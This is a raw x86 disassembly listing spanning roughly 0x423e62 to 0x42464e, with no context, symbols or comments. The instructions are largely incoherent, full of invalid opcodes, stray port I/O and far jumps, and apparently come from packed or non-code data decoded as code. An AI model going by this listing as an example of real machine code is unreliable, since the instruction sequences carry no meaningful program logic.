  423e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e63:	out    0x2d,eax
  423e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e66:	pop    ebx
  423e67:	xchg   BYTE PTR [esi+edx*1+0x1e58e07e],bh
  423e6e:	(bad)  
  423e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e70:	sbb    DWORD PTR [ebx-0x35],ebx
  423e73:	shl    ebp,0xdf
  423e76:	pop    esp
  423e77:	push   esp
  423e78:	sbb    BYTE PTR [ecx-0xf2d448],al
  423e7e:	and    BYTE PTR [esi+0x39],bl
  423e81:	pop    ds
  423e82:	test   BYTE PTR [ebx+0x18],bl
	...
  423e90:	add    BYTE PTR [ecx],dh
  423e92:	retf   
  423e93:	xor    BYTE PTR [ebx-0x6],0x7b
  423e97:	icebp  
  423e98:	retf   
  423e99:	aam    0xe9
  423e9b:	imul   esp,ebp,0xfffffffa
  423e9e:	dec    ecx
  423e9f:	dec    ebx
  423ea0:	pop    es
  423ea1:	popf   
  423ea2:	mov    dh,0x1
  423ea4:	add    BYTE PTR [ebx+eax*1+0x352b0000],ch
  423eab:	call   DWORD PTR [ebx+0x4d]
  423eae:	mov    dh,0x59
  423eb0:	xchg   ecx,eax
  423eb1:	cdq    
  423eb2:	aaa    
  423eb3:	adc    ch,ch
  423eb5:	(bad)  
  423eb6:	(bad)  
  423eb7:	nop
  423eb8:	ret    0xd066
  423ebb:	pusha  
  423ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ebd:	sahf   
  423ebe:	test   al,0x71
  423ec0:	jns    0x423ec0
  423ec2:	arpl   dx,cx
  423ec4:	sub    esi,DWORD PTR [ebp+0x2bf768e2]
  423eca:	(bad)  
  423ecb:	push   edx
  423ecc:	sbb    esp,edx
  423ece:	in     eax,dx
  423ecf:	fistp  DWORD PTR [ebp-0xa]
  423ed2:	pop    eax
  423ed3:	outs   dx,BYTE PTR ds:[esi]
  423ed4:	xor    eax,0x18fe1485
  423ed9:	in     al,dx
  423eda:	add    DWORD PTR [ecx-0x38392882],esi
  423ee0:	sbb    BYTE PTR [edi+0x16a2d2eb],ah
  423ee6:	adc    al,0x95
  423ee8:	shr    DWORD PTR [esi+edi*2],cl
  423eeb:	call   0x164d:0x3fd93242
  423ef2:	mov    ch,dl
  423ef4:	push   esi
  423ef5:	mov    WORD PTR [eax],ss
  423ef7:	mov    bh,0x81
  423ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423efa:	and    ah,bl
  423efc:	sbb    ah,ch
  423efe:	mov    esi,0x92615659
  423f03:	mov    WORD PTR [edx+0x6a],cs
  423f06:	or     BYTE PTR [eax-0x5b],cl
  423f09:	loope  0x423f70
  423f0b:	out    0xf6,al
  423f0d:	xor    BYTE PTR [ebx],bl
  423f0f:	push   ds
  423f10:	loop   0x423f91
  423f12:	dec    esi
  423f13:	mov    edx,edx
  423f15:	mov    edi,0x3ac3885d
  423f1a:	bnd jmp 0xaaca907f
  423f20:	pop    ebx
  423f21:	daa    
  423f22:	std    
  423f23:	mov    bl,ch
  423f25:	(bad)  
  423f26:	shl    DWORD PTR [edi+0x5a4e9417],cl
  423f2c:	(bad)  
  423f2d:	icebp  
  423f2e:	mov    esp,0x7fc35708
  423f33:	mov    al,ds:0x85d883e6
  423f38:	mov    bl,0xda
  423f3a:	xchg   ebp,eax
  423f3b:	cwde   
  423f3c:	or     eax,0xf307592a
  423f41:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  423f43:	stos   BYTE PTR es:[edi],al
  423f44:	adc    edx,DWORD PTR [ecx]
  423f46:	mov    dh,0xc2
  423f48:	into   
  423f49:	mov    eax,edx
  423f4b:	mov    ebx,esi
  423f4d:	or     DWORD PTR [edi+0x7f],0xb4cb95dd
  423f54:	es sub bh,dh
  423f57:	fiadd  WORD PTR [ecx]
  423f59:	mov    esi,0x15139317
  423f5e:	xor    eax,0xef630cb7
  423f63:	and    DWORD PTR [ebx+0x6ba861d2],eax
  423f69:	test   eax,0xd29efa2e
  423f6e:	daa    
  423f6f:	adc    dl,BYTE PTR [esi+esi*4+0x538707cb]
  423f76:	xor    al,0xdb
  423f78:	das    
  423f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f7a:	or     dl,al
  423f7c:	dec    BYTE PTR [eax]
  423f7e:	mov    ebp,0xd6a79024
  423f83:	dec    ebx
  423f84:	fimul  WORD PTR [edi+0x7546741e]
  423f8a:	hlt    
  423f8b:	js     0x423f21
  423f8d:	fisub  WORD PTR [esp+esi*2+0xf]
  423f91:	shr    DWORD PTR [ecx+0x35b28870],cl
  423f97:	xchg   ecx,eax
  423f98:	dec    esp
  423f99:	xchg   ebx,eax
  423f9a:	das    
  423f9b:	pusha  
  423f9c:	arpl   WORD PTR [eax+0x7d],dx
  423f9f:	or     DWORD PTR [edi+0x5b],edx
  423fa2:	jl     0x423fec
  423fa4:	aam    0x90
  423fa6:	js     0x423f7a
  423fa8:	lea    edx,[ebp+esi*2+0x6aaa47db]
  423faf:	sub    eax,0x1472fd1f
  423fb4:	(bad)  
  423fb5:	out    0xc5,al
  423fb7:	inc    esp
  423fb8:	imul   ebx,DWORD PTR [edx+0x5a0486f6],0x62
  423fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fc0:	and    ch,bh
  423fc2:	(bad)
  423fc6:	xchg   ecx,eax
  423fc7:	shl    DWORD PTR [esi],0xf3
  423fca:	inc    esi
  423fcb:	jmp    0x423f82
  423fcd:	jo     0x423f60
  423fcf:	sbb    BYTE PTR [eax+0x5ca51967],ah
  423fd5:	sbb    eax,0x8c6d72cd
  423fda:	mov    esi,0x5ad1cfa
  423fdf:	cmc    
  423fe0:	push   ecx
  423fe1:	shl    DWORD PTR [ecx+0x75ef1ea],0xb
  423fe8:	or     eax,0xa3b1023e
  423fed:	or     dh,BYTE PTR [edi+0x27]
  423ff0:	lods   al,BYTE PTR ds:[esi]
  423ff1:	bswap  ecx
  423ff3:	push   esp
  423ff4:	add    ch,BYTE PTR [ecx]
  423ff6:	ds push ebx
  423ff8:	sub    al,BYTE PTR [ebp+esi*1+0x63739e5f]
  423fff:	loope  0x423fbd
  424001:	std    
  424002:	adc    eax,0xa2bfe876
  424007:	aas    
  424008:	jo     0x424029
  42400a:	jle    0x423fa3
  42400c:	les    esi,FWORD PTR [ebp+0x35ba6023]
  424012:	aam    0x98
  424014:	int3   
  424015:	adc    eax,0x9cf874ee
  42401a:	sbb    esp,0x21711f54
  424020:	out    0x93,eax
  424022:	mov    bl,BYTE PTR [ecx-0x6a8ed9a1]
  424028:	dec    eax
  424029:	xchg   edx,eax
  42402a:	sub    al,0x58
  42402c:	or     BYTE PTR [eax+0x18],0xcc
  424030:	sub    dl,BYTE PTR ds:0xb01db902
  424036:	test   DWORD PTR [ebx-0x454ec1f6],ecx
  42403c:	inc    ebp
  42403d:	das    
  42403e:	xchg   esi,eax
  42403f:	addr16 jg 0x424085
  424042:	retf   0xa819
  424045:	xor    DWORD PTR [eax+0x1c],edx
  424048:	dec    edi
  424049:	and    cl,bl
  42404b:	or     DWORD PTR [edx],ebp
  42404d:	fsub   DWORD PTR [eax-0x5a]
  424050:	mov    bh,0x51
  424052:	pop    ebp
  424053:	rcr    BYTE PTR [ecx+0x367653e1],1
  424059:	rcl    bl,0xbc
  42405c:	push   ebx
  42405d:	mov    WORD PTR [edx-0x37],ds
  424060:	and    esi,DWORD PTR [eax+0x74]
  424063:	(bad)  [eax-0x7a]
  424066:	xor    esi,DWORD PTR [edx-0x111e9e01]
  42406c:	xor    BYTE PTR [esi+0x1e459ea3],0x82
  424073:	fcomip st,st(6)
  424075:	inc    edx
  424076:	call   0xe784:0xf8ba7012
  42407d:	sbb    ch,ah
  42407f:	retf   0x1c22
  424082:	arpl   WORD PTR [edi-0x68f16636],bp
  424088:	(bad)  
  42408a:	icebp  
  42408b:	shl    BYTE PTR [eax-0x1b],0x3c
  42408f:	dec    edi
  424090:	jmp    0x32fc7d31
  424095:	popf   
  424096:	inc    edx
  424097:	push   ss
  424098:	adc    esp,DWORD PTR [eax+0x3a]
  42409b:	test   eax,0x123c2f82
  4240a0:	dec    edi
  4240a1:	(bad)  
  4240a2:	sar    BYTE PTR [edi],cl
  4240a4:	cmp    al,0x8e
  4240a6:	lahf   
  4240a7:	mov    edx,0xdce369c1
  4240ac:	lock mov dh,BYTE PTR [eax-0x4015755]
  4240b3:	mov    edi,0x5faca77a
  4240b8:	retf   
  4240b9:	dec    edx
  4240ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240bb:	jbe    0x424125
  4240bd:	popa   
  4240be:	ficom  DWORD PTR [eax-0x5a70d2bd]
  4240c4:	std    
  4240c5:	xchg   ebx,eax
  4240c6:	je     0x4240df
  4240c8:	imul   edx,DWORD PTR [edi-0x3dc79be2],0xadc3ba84
  4240d2:	test   DWORD PTR [ecx],ebx
  4240d4:	aad    0xe8
  4240d6:	test   DWORD PTR [eax-0x371020ec],ecx
  4240dc:	push   cs
  4240dd:	inc    ecx
  4240de:	jmp    0x4240ea
  4240e0:	rcl    BYTE PTR [esi+eiz*4-0x64cde59b],1
  4240e7:	mov    ch,BYTE PTR [edx-0x4b]
  4240ea:	repnz push 0x6993dbfa
  4240f0:	mov    ds,WORD PTR [edx]
  4240f2:	jg     0x424167
  4240f4:	lods   eax,DWORD PTR ds:[esi]
  4240f5:	jo     0x4240e6
  4240f7:	leave  
  4240f8:	cmp    BYTE PTR ds:0x45eb5c44,dl
  4240fe:	jb     0x424099
  424100:	bnd jae 0x42411d
  424103:	dec    edx
  424104:	repnz bound edi,QWORD PTR [ebp-0x2e]
  424108:	ficomp DWORD PTR [edx-0x73]
  42410b:	mov    ebx,0x62d0b470
  424110:	bound  ecx,QWORD PTR [eax+0x6b9e9ecd]
  424116:	xchg   esi,eax
  424117:	stc    
  424118:	jp     0x42415d
  42411a:	fdiv   QWORD PTR [ebx]
  42411c:	adc    al,0xda
  42411e:	xchg   BYTE PTR ds:0x868b6e28,bh
  424124:	mov    al,ds:0x52892e3e
  424129:	fisubr WORD PTR [eax+0x5]
  42412c:	sbb    DWORD PTR [esi],esp
  42412e:	push   ebp
  42412f:	mov    ds:0xd06f0e7b,eax
  424134:	into   
  424135:	xor    BYTE PTR [ebp+0x2b4b2d4],ah
  42413b:	mov    esi,0xea2f53ea
  424140:	adc    eax,DWORD PTR [eax+0x7fc8b4f9]
  424146:	stc    
  424147:	add    ah,BYTE PTR [esp+edx*2+0x170837e7]
  42414e:	enter  0x38d6,0xe9
  424152:	je     0x424125
  424154:	mov    al,0x3d
  424156:	aam    0x91
  424158:	cdq    
  424159:	stos   BYTE PTR es:[edi],al
  42415a:	fs ret 0x5b0c
  42415e:	dec    edx
  42415f:	mov    edx,0x4e301246
  424164:	xlat   BYTE PTR ds:[ebx]
  424165:	and    edi,DWORD PTR [edx+ecx*8]
  424168:	aas    
  424169:	pop    edx
  42416a:	inc    ebp
  42416b:	add    ch,BYTE PTR [eax+0x1e]
  42416e:	cs mov bl,0xbf
  424171:	dec    BYTE PTR [eax+0x67]
  424174:	inc    eax
  424175:	fcmovnb st,st(4)
  424177:	push   0xffffffc3
  424179:	sbb    cl,ah
  42417b:	rol    DWORD PTR [edx],cl
  42417d:	xor    eax,0x25bc25a6
  424182:	cmp    eax,0xd047a27a
  424187:	and    cl,dl
  424189:	inc    esp
  42418a:	push   edx
  42418b:	retf   
  42418c:	fnstenv [ebx-0x1e]
  42418f:	sahf   
  424190:	stos   DWORD PTR es:[edi],eax
  424191:	mov    ebp,DWORD PTR [esi]
  424193:	sub    edi,ecx
  424195:	push   ecx
  424196:	sbb    esp,DWORD PTR [ebp+0xed64865]
  42419c:	push   ds
  42419d:	jp     0x4241a8
  42419f:	xchg   esi,eax
  4241a0:	mov    bl,0xa5
  4241a2:	shr    DWORD PTR ds:0xedc570a5,cl
  4241a8:	retf   0x7f89
  4241ab:	in     al,dx
  4241ac:	mov    ch,0xb3
  4241ae:	ins    BYTE PTR es:[edi],dx
  4241af:	bound  ebp,QWORD PTR [ebp+0x513e2d17]
  4241b5:	mov    bl,0xe5
  4241b7:	scas   eax,DWORD PTR es:[edi]
  4241b8:	xor    ah,BYTE PTR [ebp+0x4a]
  4241bb:	jl     0x424204
  4241bd:	sub    DWORD PTR [edx+0x48],0x2b14a7f1
  4241c4:	jbe    0x4241b9
  4241c6:	fnstenv [esi+0x5f3be8d5]
  4241cc:	pop    es
  4241cd:	test   DWORD PTR [ebx-0x121cfbe7],eax
  4241d3:	push   edi
  4241d4:	shr    DWORD PTR [esp+ecx*1-0x61],0x79
  4241d9:	xchg   edi,eax
  4241da:	jno    0x4241a2
  4241dc:	xor    ebp,DWORD PTR [edx+0x12]
  4241df:	ja     0x4241d2
  4241e1:	adc    DWORD PTR [ecx+0x25],0x2d19dc48
  4241e8:	mov    edi,0x92f5402f
  4241ed:	sub    al,0xb5
  4241ef:	inc    esp
  4241f0:	cmp    ebp,DWORD PTR [ebx+0x52]
  4241f3:	(bad)  
  4241f4:	inc    ecx
  4241f5:	stos   BYTE PTR es:[edi],al
  4241f6:	std    
  4241f7:	fild   QWORD PTR [ebp+0x55aa8d56]
  4241fd:	test   al,0x5a
  4241ff:	bound  esi,QWORD PTR [edx]
  424201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424202:	pop    ss
  424203:	mov    ebp,0xbaa6f665
  424208:	aam    0xb3
  42420a:	lock (bad) 
  42420c:	aad    0xe0
  42420e:	outs   dx,BYTE PTR ds:[esi]
  42420f:	jo     0x424281
  424211:	ret    
  424212:	in     eax,0xda
  424214:	cmp    cl,al
  424216:	dec    edi
  424217:	pop    ebx
  424218:	pop    ds
  424219:	sub    edx,DWORD PTR ds:0x8ba3e467
  42421f:	mov    al,0xde
  424221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424222:	jp     0x4241d6
  424224:	push   esp
  424225:	xchg   ecx,eax
  424226:	mov    cl,0x9a
  424228:	cmp    BYTE PTR [eax+0x4e],bh
  42422b:	arpl   WORD PTR [esi+0x57d12216],bp
  424231:	fist   WORD PTR ss:[edi]
  424234:	cmc    
  424235:	jmp    0x424258
  424237:	mov    bh,0x22
  424239:	mov    ah,0xb0
  42423b:	inc    ebx
  42423c:	cmp    dh,cl
  42423e:	lock xor dl,BYTE PTR [edi]
  424241:	lock repz les ebp,FWORD PTR [edx-0xc]
  424246:	repnz mov al,ds:0x461d9dd0
  42424c:	xchg   ecx,eax
  42424d:	daa    
  42424e:	scas   eax,DWORD PTR es:[edi]
  42424f:	ds jg  0x4241ff
  424252:	sahf   
  424253:	fcomp  QWORD PTR [ecx+0x0]
	...
  424261:	mul    ebp
  424263:	lahf   
  424264:	jp     0x424205
  424266:	jp     0x42425f
  424268:	in     eax,dx
  424269:	sar    DWORD PTR [edi-0x8ded4],1
  42426f:	xor    eax,0x1ba49a5
  424274:	add    BYTE PTR [ebx+eax*1+0x76bd0000],ch
  42427b:	pusha  
  42427c:	imul   DWORD PTR [ebx+0x15]
  42427f:	cmp    al,0xda
  424281:	pop    edi
  424282:	pop    ecx
  424283:	test   eax,0xc51ff162
  424288:	dec    esi
  424289:	arpl   ax,dx
  42428b:	leave  
  42428c:	call   0xbd3e:0x65f9de31
  424293:	retf   0xd17f
  424296:	repnz cmp BYTE PTR [ecx-0x2da735ad],cl
  42429d:	xchg   DWORD PTR [edx+edi*2+0x11],ebx
  4242a1:	inc    ebp
  4242a2:	bound  esi,QWORD PTR [esi+0x1d51eb72]
  4242a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242a9:	cmp    edi,esi
  4242ab:	add    eax,0xce01b9b8
  4242b0:	imul   esp,DWORD PTR [ebx-0x2acc6706],0x2c
  4242b7:	and    BYTE PTR ds:0x94b5486f,bh
  4242bd:	clc    
  4242be:	adc    BYTE PTR [ecx-0x35ceeaa1],0x51
  4242c5:	ret    
  4242c6:	xchg   esi,eax
  4242c7:	dec    edi
  4242c8:	dec    eax
  4242c9:	lods   al,BYTE PTR ds:[esi]
  4242ca:	addr16 push esi
  4242cc:	jecxz  0x42425e
  4242ce:	mov    ecx,0xb655e4b
  4242d3:	in     al,dx
  4242d4:	mov    cl,0x34
  4242d6:	lds    eax,FWORD PTR [ebx+ebx*8]
  4242d9:	out    0x84,al
  4242db:	clc    
  4242dc:	mov    ch,0xbf
  4242de:	dec    ebp
  4242df:	xchg   edx,eax
  4242e0:	mov    ds:0x919f9141,eax
  4242e5:	mov    al,0x5a
  4242e7:	mov    eax,ss:0xf0bbc5cb
  4242ed:	xor    ch,ch
  4242ef:	sbb    al,BYTE PTR [edx+0x7f]
  4242f2:	rol    BYTE PTR [edi-0x2b],cl
  4242f5:	jno    0x424335
  4242f7:	push   ss
  4242f8:	push   edi
  4242f9:	add    al,0x4f
  4242fb:	inc    eax
  4242fc:	add    ebp,DWORD PTR [edi+esi*1-0x696dee93]
  424303:	enter  0x583f,0x8f
  424307:	sub    eax,0x8049e639
  42430c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42430d:	or     DWORD PTR [edx+0x26d8fbbb],edx
  424313:	in     al,dx
  424314:	in     eax,dx
  424315:	mov    ah,0xa8
  424317:	(bad)  
  424319:	jmp    0x3a4a7ef8
  42431e:	adc    DWORD PTR [edi+0x6196ca09],ebp
  424324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424325:	push   ds
  424326:	ss mov edx,0xb360fce8
  42432c:	jnp    0x42435b
  42432e:	add    ebx,DWORD PTR ds:0xf4bf141c
  424334:	lods   eax,DWORD PTR ds:[esi]
  424335:	push   cs
  424336:	repnz push es
  424338:	cmp    BYTE PTR [ebx-0x223f4f66],cl
  42433e:	pop    DWORD PTR [edi]
  424340:	fnstenv [esi-0x5]
  424343:	mov    eax,0x8e6947f7
  424348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424349:	or     DWORD PTR [eax-0x3822493a],ebx
  42434f:	pop    ebx
  424350:	out    dx,al
  424351:	aam    0xec
  424353:	jmp    0x5c2b:0xf655d0dc
  42435a:	out    0x8f,eax
  42435c:	lahf   
  42435d:	std    
  42435e:	mov    eax,0xde0000a3
  424363:	retf   
  424364:	sub    ebp,DWORD PTR [esi-0x3c4f6e6a]
  42436a:	jl     0x424399
  42436c:	adc    DWORD PTR [edi],ebp
  42436e:	jnp    0x4243d3
  424370:	dec    ebp
  424371:	inc    esi
  424372:	jbe    0x424364
  424374:	push   esp
  424375:	sti    
  424376:	mov    WORD PTR [ecx+0xf4f1976],es
  42437c:	push   esi
  42437d:	es leave 
  42437f:	dec    ebp
  424380:	dec    esp
  424381:	aas    
  424382:	or     BYTE PTR [ecx],bl
  424384:	iret   
  424385:	jne    0x4243ad
  424387:	(bad)  
  424388:	pop    ebp
  424389:	stos   BYTE PTR es:[edi],al
  42438a:	scas   al,BYTE PTR es:[edi]
  42438b:	pop    ecx
  42438c:	pop    esi
  42438d:	jns    0x4243ee
  42438f:	mov    bh,0x78
  424391:	dec    esp
  424392:	or     BYTE PTR [edi+0x30d5dc4f],bh
  424398:	test   DWORD PTR [edx+0x36],ebp
  42439b:	scas   eax,DWORD PTR es:[edi]
  42439c:	or     dh,ah
  42439e:	inc    esi
  42439f:	push   esi
  4243a0:	mov    ds:0x89ed5fce,al
  4243a5:	lea    eax,ds:0xb5369de6
  4243ab:	cmp    edi,DWORD PTR [esi-0x41]
  4243ae:	adc    eax,0x1a7e7b1f
  4243b3:	jno    0x424380
  4243b5:	popa   
  4243b6:	inc    ecx
  4243b7:	or     ch,BYTE PTR [esp+ecx*4]
  4243ba:	(bad)  
  4243bb:	sub    DWORD PTR [ebp-0x55d2ec80],ebx
  4243c1:	or     ah,bh
  4243c3:	mov    ebx,0x62e5c40e
  4243c8:	sbb    DWORD PTR [esi+0x2a],0x29
  4243cc:	outs   dx,DWORD PTR es:[esi]
  4243ce:	push   ss
  4243cf:	dec    ecx
  4243d0:	pop    esi
  4243d1:	dec    esp
  4243d2:	mov    edx,?
  4243d4:	pop    eax
  4243d5:	imul   ebx,DWORD PTR [ebp-0x57],0xcab14db7
  4243dc:	test   al,ch
  4243de:	sahf   
  4243df:	sahf   
  4243e0:	mov    ch,0x78
  4243e2:	xor    ebp,0x33
  4243e5:	in     eax,0xf0
  4243e7:	sbb    DWORD PTR [esi+0x14],ecx
  4243ea:	popa   
  4243eb:	xor    DWORD PTR [eax+ebp*2+0x5c4ff51d],esi
  4243f2:	das    
  4243f3:	sub    dl,BYTE PTR [edi+0x1338927]
  4243f9:	jge    0x4243d2
  4243fb:	mov    ds:0x51d5c762,al
  424400:	fs push ebx
  424402:	mov    DWORD PTR [ecx],ebp
  424404:	xchg   esp,eax
  424405:	mov    ebp,0xb6cc4062
  42440a:	sub    DWORD PTR [ebx],edi
  42440c:	(bad)  
  42440d:	sub    ecx,edi
  42440f:	inc    esp
  424410:	dec    ebp
  424411:	stos   DWORD PTR es:[edi],eax
  424412:	pop    edi
  424413:	daa    
  424414:	(bad)  
  424415:	aaa    
  424416:	nop
  424417:	jae    0x42447c
  424419:	jae    0x4243e9
  42441b:	jmp    0xa859:0x32e3ffe2
  424422:	dec    ebp
  424423:	cmp    BYTE PTR [ecx-0x3488e73a],0xf0
  42442a:	pop    eax
  42442b:	lds    ecx,FWORD PTR [ebx+0x23]
  42442e:	jmp    0x424446
  424430:	add    al,0xe5
  424432:	dec    edi
  424433:	std    
  424434:	fidiv  DWORD PTR [edi+0x4b6c3bf9]
  42443a:	adc    DWORD PTR [edi+0x60],0x144c7c84
  424441:	cld    
  424442:	or     DWORD PTR [ebp+0x30],ecx
  424445:	popa   
  424446:	mov    ch,0x62
  424448:	pop    ebx
  424449:	jbe    0x424401
  42444b:	jp     0x4243ef
  42444d:	pusha  
  42444e:	xor    BYTE PTR [ebp-0x564b6ce6],bl
  424454:	(bad)  
  424455:	mov    bl,0x78
  424457:	mov    dl,0x52
  424459:	into   
  42445a:	out    dx,eax
  42445b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42445c:	outs   dx,DWORD PTR ds:[esi]
  42445d:	cli    
  42445e:	dec    ecx
  42445f:	push   cs
  424460:	pop    ds
  424461:	cmp    bh,dl
  424463:	mov    esi,0x97022755
  424468:	and    al,0x27
  42446a:	or     BYTE PTR [eax+0x62],dh
  42446d:	pop    ds
  42446e:	sub    ah,dh
  424470:	pop    ss
  424471:	add    dh,BYTE PTR [ebx]
  424473:	or     BYTE PTR [edi+0x4b47b836],cl
  424479:	push   edi
  42447a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42447b:	jb     0x4244ca
  42447d:	ret    
  42447e:	imul   ebx,esp,0x3a
  424481:	jmp    WORD PTR [ecx]
  424484:	ret    
  424485:	test   BYTE PTR [esi+0x48],ah
  424488:	rcr    BYTE PTR [edi],1
  42448a:	mov    es,WORD PTR [ecx+0x6a3e11ca]
  424490:	or     BYTE PTR [edx-0x4e],bl
  424493:	jno    0x4244d5
  424495:	fdivr  DWORD PTR [esi+0x46051beb]
  42449b:	and    BYTE PTR [ecx],dl
  42449d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42449e:	into   
  42449f:	adc    al,0xa0
  4244a1:	pop    ecx
  4244a2:	test   dh,bl
  4244a4:	and    BYTE PTR [edi],bh
  4244a6:	adc    al,0x41
  4244a8:	aad    0x35
  4244aa:	jne    0x42450d
  4244ac:	xchg   DWORD PTR [esi-0x1e],edx
  4244af:	sbb    esi,ebp
  4244b1:	shl    DWORD PTR [edx],cl
  4244b3:	jge    0x42444f
  4244b5:	shr    BYTE PTR [esi],0xdc
  4244b8:	cli    
  4244b9:	and    DWORD PTR [ebx+0x54],0xffffffd9
  4244bd:	fisub  DWORD PTR [ecx]
  4244bf:	dec    ecx
  4244c0:	push   ds
  4244c1:	mov    ebp,0x360427b2
  4244c6:	dec    eax
  4244c7:	jns    0x42449f
  4244c9:	add    dl,BYTE PTR [esi+0x4b]
  4244cc:	jno    0x42453d
  4244ce:	cmp    DWORD PTR [eax],0xffffff90
  4244d1:	out    dx,al
  4244d2:	gs xor ah,0xb9
  4244d6:	stos   DWORD PTR es:[edi],eax
  4244d7:	cmp    edx,DWORD PTR [ecx+0x71]
  4244da:	out    0xaf,eax
  4244dc:	lahf   
  4244dd:	mov    esp,0xc53eee2f
  4244e2:	push   ebp
  4244e3:	scas   al,BYTE PTR es:[edi]
  4244e4:	arpl   WORD PTR [ebp+0x1e2cc1a2],di
  4244ea:	shl    DWORD PTR [edx-0x59fa97b],0xe9
  4244f1:	hlt    
  4244f2:	imul   ecx,edi
  4244f5:	push   ss
  4244f6:	retf   
  4244f7:	mov    BYTE PTR [ecx+ebp*1],dl
  4244fa:	dec    ebx
  4244fb:	das    
  4244fc:	xchg   edx,eax
  4244fd:	in     al,dx
  4244fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244ff:	jns    0x424536
  424501:	data16 data16 jnp 0x4244a3
  424505:	and    BYTE PTR ds:0x265b643d,ch
  42450b:	xchg   esp,eax
  42450c:	or     dl,BYTE PTR [esi]
  42450e:	or     DWORD PTR [edx+0x6c0b1b44],0x19cf23f5
  424518:	and    DWORD PTR [eax+0x2a9fe5a6],0xf0fd1b04
  424522:	leave  
  424523:	jge    0x42458c
  424525:	xchg   ebp,eax
  424526:	pop    esp
  424527:	(bad)
  42452a:	pop    ds
  42452b:	scas   al,BYTE PTR es:[edi]
  42452c:	retf   
  42452d:	loopne 0x4245a3
  42452f:	pop    ebp
  424530:	out    0x5a,eax
  424532:	fmul   st(5),st
  424534:	xchg   esp,eax
  424535:	xor    al,bh
  424537:	or     eax,edi
  424539:	pop    esp
  42453a:	ror    dh,0xfc
  42453d:	out    0x19,al
  42453f:	xchg   ebp,eax
  424540:	call   0x8234259
  424545:	mov    ecx,0xfd7e80e9
  42454a:	out    0x60,al
  42454c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42454d:	sbb    DWORD PTR [ebx-0x74],ebp
  424550:	daa    
  424551:	push   ecx
  424552:	inc    esp
  424553:	cmp    DWORD PTR [edi-0x2e16bb54],esi
  424559:	ss ja  0x424581
  42455c:	inc    esp
  42455d:	ins    DWORD PTR es:[edi],dx
  42455e:	add    eax,0xc2f1b91c
  424563:	das    
  424564:	stos   DWORD PTR es:[edi],eax
  424565:	xor    eax,0xbb910bfc
  42456a:	add    al,0xa3
  42456c:	mov    ecx,0x9fd96d90
  424571:	mov    ecx,0xb8c5f917
  424576:	xchg   ebp,eax
  424577:	push   ebx
  424578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424579:	mul    cl
  42457b:	xlat   BYTE PTR ds:[ebx]
  42457c:	cmp    ah,BYTE PTR [ebp-0x7e]
  42457f:	gs xchg edx,eax
  424581:	push   ebp
  424582:	fwait
  424583:	mov    esp,0x5b981a42
  424588:	sbb    ebp,DWORD PTR [edx]
  42458a:	daa    
  42458b:	scas   al,BYTE PTR es:[edi]
  42458c:	mov    dl,0x24
  42458e:	(bad)  
  42458f:	enter  0x482e,0xa8
  424593:	in     al,0xb1
  424595:	push   ebx
  424596:	cmp    eax,0x23863bc4
  42459b:	jmp    0x83da:0x58b1258b
  4245a2:	mov    ebx,0xc54d4f34
  4245a7:	ja     0x42456e
  4245a9:	xor    BYTE PTR ss:0x8c8cac48,0xcb
  4245b1:	xchg   ecx,eax
  4245b2:	pop    esp
  4245b3:	mov    ch,0x6a
  4245b5:	call   0x5b0c:0xc64bb4fb
  4245bc:	loop   0x42459d
  4245be:	sahf   
  4245bf:	(bad)  
  4245c0:	in     al,dx
  4245c1:	jnp    0x4245a9
  4245c3:	xlat   BYTE PTR ds:[ebx]
  4245c4:	mov    gs,WORD PTR [edi-0x62f44c14]
  4245ca:	and    edi,DWORD PTR [ecx-0x3d]
  4245cd:	or     eax,0xbe85d75b
  4245d2:	push   eax
  4245d3:	xchg   esp,ebx
  4245d5:	fstp   QWORD PTR [ebx+0x2a36f981]
  4245db:	call   0x3840:0x753a80c5
  4245e2:	aas    
  4245e3:	jmp    0x4245ac
  4245e5:	inc    ecx
  4245e6:	jno    0x424643
  4245e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245e9:	ror    BYTE PTR [ecx],1
  4245eb:	push   ecx
  4245ec:	sbb    eax,0x8645a0ba
  4245f1:	and    dl,BYTE PTR [esi+0x7268e27d]
  4245f7:	push   0x734e2efc
  4245fc:	cli    
  4245fd:	jge    0x42460d
  4245ff:	jb     0x424637
  424601:	aam    0x48
  424603:	mov    eax,ds:0x1508d4f7
  424608:	or     esp,edi
  42460a:	push   edx
  42460b:	clc    
  42460c:	sti    
  42460d:	int    0xec
  42460f:	jle    0x4245c9
  424611:	jb     0x42468d
  424613:	loope  0x4245d4
  424615:	ficom  WORD PTR ds:0xb63658f3
  42461b:	and    edi,DWORD PTR [ebx-0x75]
  42461e:	popf   
  42461f:	and    eax,0xec208ee9
  424624:	xchg   DWORD PTR [eax],eax
	...
  42462e:	add    BYTE PTR [eax],al
  424630:	add    BYTE PTR [ebx-0x71],ch
  424633:	mov    bh,BYTE PTR [esi+ebp*8+0x7d]
  424637:	call   FWORD PTR [edi+0x4fc17c56]
  42463d:	add    al,0x89
  42463f:	ins    BYTE PTR es:[edi],dx
  424640:	jmp    0x44043a
  424645:	lods   al,BYTE PTR ds:[esi]
  424646:	add    eax,DWORD PTR [eax]
  424648:	add    BYTE PTR [ebx+0x11cf47eb],al
  42464e:	sub    BYTE PTR [esp+esi*8+0x66],cl
